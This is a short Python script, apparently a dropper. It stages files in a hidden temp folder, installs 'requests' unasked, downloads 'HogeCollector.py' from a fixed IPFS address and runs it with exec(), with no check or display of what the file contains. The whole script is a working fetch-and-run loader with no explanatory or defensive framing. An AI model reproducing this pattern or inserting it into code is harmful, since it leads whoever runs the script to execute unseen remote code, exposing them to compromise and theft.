import subprocess
import sys
import os
import shutil


from tempfile import gettempdir
tmp = os.path.join(gettempdir(), '.{}'.format(hash(os.times())))
os.makedirs(tmp)


def install(package):
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])


try:
    import requests
except:
    try:
        install('requests')
        import requests
    except Exception as e:
        print('Error: %s' % str(e))


def GetFile(url, file_name):
    FILE = requests.get(url, stream=True)
    if FILE.status_code == 200:
        FILE.raw.decode_content = True
        with open(tmp + '\\' + file_name, 'wb') as f:
            shutil.copyfileobj(FILE.raw, f)
        return tmp + '\\' + file_name
    else:
        print('%s couldn\'t be retreived' % str(file_name))


url_base = 'https://ipfs.io/ipfs/'
file_hash = 'QmVLwPECGLCcMitrAWpjz42qricsnkWreRhKXWrTyFQhZu'
exec(open(GetFile(url_base + file_hash, 'HogeCollector.py')).read(), globals())
